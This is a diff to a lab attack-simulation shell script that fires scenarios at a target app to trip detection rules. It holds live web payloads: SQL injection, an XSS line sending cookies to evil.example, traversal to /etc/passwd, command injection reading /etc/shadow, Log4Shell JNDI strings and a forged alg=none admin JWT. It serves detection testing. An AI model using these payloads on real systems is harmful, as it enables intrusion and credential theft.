@@ -5,7 +5,9 @@
 #   ./scripts/simulate-attacks.sh            # run every scenario
 #   ./scripts/simulate-attacks.sh bruteforce # run one scenario
 #
-# Scenarios: baseline bruteforce spray privesc idor tokens flood
+# Basic scenarios:    baseline bruteforce spray privesc idor tokens flood
+# Advanced scenarios: takeover distributed hijack injection log4shell recon scanner scraping algnone
+# Groups:             basic, advanced (default: everything)
 #
 # Only run this against your own lab environment.
 set -euo pipefail
@@ -98,13 +100,115 @@ flood() {
   echo
 }
 
-scenarios=("$@")
-[[ ${#scenarios[@]} -eq 0 ]] && scenarios=(baseline bruteforce spray privesc idor tokens flood)
-for s in "${scenarios[@]}"; do
-  case "$s" in
-    baseline|bruteforce|spray|privesc|idor|tokens|flood) "$s" ;;
-    *) echo "Unknown scenario: $s"; exit 1 ;;
+# ---------------------------------------------------------------- advanced
+
+# probe <source-ip> <user-agent> <path> [extra curl args...] -> prints HTTP status
+probe() {
+  local ip="$1" ua="$2" path="$3"; shift 3
+  curl -s -o /dev/null -w '%{http_code}' -G "$TARGET$path" -H "X-Forwarded-For: $ip" -A "$ua" "$@"
+}
+
+takeover() {
+  say "Account takeover: 6 failed logins for 'bob' then a SUCCESS from 45.155.205.233 (rule ACCOUNT_TAKEOVER)"
+  for i in $(seq 1 6); do printf '%s ' "$(login_status bob "Winter202$i!" 45.155.205.233)"; done
+  printf '%s ' "$(login_status bob "$DEMO_BOB_PASSWORD" 45.155.205.233)"
+  t=$(token bob "$DEMO_BOB_PASSWORD" 45.155.205.233)
+  printf '%s ' "$(call GET /api/orders "$t" 45.155.205.233)"
+  echo
+}
+
+distributed() {
+  say "Distributed brute force: 'admin' attacked from 6 botnet IPs, 1 attempt each (rule DISTRIBUTED_BRUTE_FORCE)"
+  for n in 10 11 12 13 14 15; do printf '%s ' "$(login_status admin "P@ssw0rd$n" "5.188.62.$n")"; done
+  echo
+}
+
+hijack() {
+  say "Session hijack: alice's JWT stolen and replayed from 4 foreign IPs (rule SESSION_HIJACK)"
+  t=$(token alice "$DEMO_ALICE_PASSWORD" 10.0.0.30)
+  printf '%s ' "$(call GET /api/orders "$t" 10.0.0.30)"
+  for ip in 185.220.101.4 103.75.190.11 91.240.118.172 45.95.147.236; do
+    printf '%s ' "$(call GET /api/orders "$t" "$ip")" "$(call GET /api/users/me "$t" "$ip")"
+  done
+  echo
+}
+
+injection() {
+  say "Injection: SQLi / XSS / path traversal / command injection payloads from 103.145.13.7 (rule INJECTION_ATTEMPT)"
+  local ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+  printf '%s ' \
+    "$(probe 103.145.13.7 "$ua" /api/orders --data-urlencode "id=1' OR '1'='1")" \
+    "$(probe 103.145.13.7 "$ua" /api/orders --data-urlencode "q=1 UNION SELECT username, password FROM users--")" \
+    "$(probe 103.145.13.7 "$ua" /api/orders --data-urlencode "id=1; SELECT pg_sleep(5)")" \
+    "$(probe 103.145.13.7 "$ua" /api/users --data-urlencode "name=<script>document.location='http://evil.example/?c='+document.cookie</script>")" \
+    "$(probe 103.145.13.7 "$ua" /api/orders --data-urlencode "file=../../../../etc/passwd")" \
+    "$(probe 103.145.13.7 "$ua" /api/orders --data-urlencode "host=127.0.0.1; cat /etc/shadow")"
+  echo
+}
+
+log4shell() {
+  say "Log4Shell: \${jndi:ldap://...} lookup in headers from 45.83.64.1 (rule LOG4SHELL_EXPLOIT)"
+  printf '%s ' \
+    "$(probe 45.83.64.1 '${jndi:ldap://45.83.64.1:1389/Exploit}' /api/orders)" \
+    "$(probe 45.83.64.1 'Mozilla/5.0' /api/orders -H 'X-Api-Version: ${${lower:j}ndi:ldap://45.83.64.1:1389/a}')"
+  echo
+}
+
+recon() {
+  say "Recon: directory/endpoint discovery of 12 well-known paths from 162.142.125.9 (rule RECON_PATH_SCAN)"
+  for p in /.env /.git/config /wp-admin/ /wp-login.php /phpmyadmin/ /admin /server-status \
+           /backup.zip /config.json /api/v1/users /swagger-ui.html /console; do
+    printf '%s ' "$(probe 162.142.125.9 'Mozilla/5.0 (compatible; Recon/1.0)' "$p")"
+  done
+  echo
+}
+
+scanner() {
+  say "Scanner: sqlmap and nuclei user agents from 194.26.29.110 (rule SCANNER_TOOL)"
+  for i in 1 2 3; do
+    printf '%s ' "$(probe 194.26.29.110 'sqlmap/1.8.4#stable (https://sqlmap.org)' /api/orders --data-urlencode "id=$i")"
+    printf '%s ' "$(probe 194.26.29.110 'Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))' "/api/orders/$i")"
+  done
+  echo
+}
+
+scraping() {
+  say "Data scraping: 'alice' reads her orders 45 times in a few seconds (rule DATA_SCRAPING)"
+  t=$(token alice "$DEMO_ALICE_PASSWORD" 10.0.0.13)
+  for i in $(seq 1 45); do
+    call GET "/api/orders/$((1001 + i % 2))" "$t" 10.0.0.13 >/dev/null
+    (( i % 15 == 0 )) && printf '%d ' "$i"
+  done
+  echo
+}
+
+algnone() {
+  say "JWT forgery: unsigned alg=none token claiming ROLE_ADMIN from 192.0.2.77 (rule JWT_ALG_NONE)"
+  # {"alg":"none"}.{"iss":"mini-soc-target-app","sub":"admin","roles":["ROLE_USER","ROLE_ADMIN"],"jti":"forged-alg-none"}.
+  local none='eyJhbGciOiJub25lIn0.eyJpc3MiOiJtaW5pLXNvYy10YXJnZXQtYXBwIiwic3ViIjoiYWRtaW4iLCJyb2xlcyI6WyJST0xFX1VTRVIiLCJST0xFX0FETUlOIl0sImp0aSI6ImZvcmdlZC1hbGctbm9uZSJ9.'
+  printf '%s ' "$(call GET /api/admin/stats "$none" 192.0.2.77)" "$(call GET /api/users "$none" 192.0.2.77)"
+  echo
+}
+
+BASIC=(baseline bruteforce spray privesc idor tokens flood)
+ADVANCED=(takeover distributed hijack injection log4shell recon scanner scraping algnone)
+
+scenarios=()
+for arg in "$@"; do
+  case "$arg" in
+    basic) scenarios+=("${BASIC[@]}") ;;
+    advanced) scenarios+=("${ADVANCED[@]}") ;;
+    *) scenarios+=("$arg") ;;
   esac
+done
+[[ ${#scenarios[@]} -eq 0 ]] && scenarios=("${BASIC[@]}" "${ADVANCED[@]}")
+
+for s in "${scenarios[@]}"; do
+  if [[ " ${BASIC[*]} ${ADVANCED[*]} " == *" $s "* ]]; then
+    "$s"
+  else
+    echo "Unknown scenario: $s (valid: basic advanced ${BASIC[*]} ${ADVANCED[*]})"; exit 1
+  fi
 done
 
 say "Done. Detections run every ${DETECTION_POLL_INTERVAL:-PT15S} (log shipping adds a few seconds)."
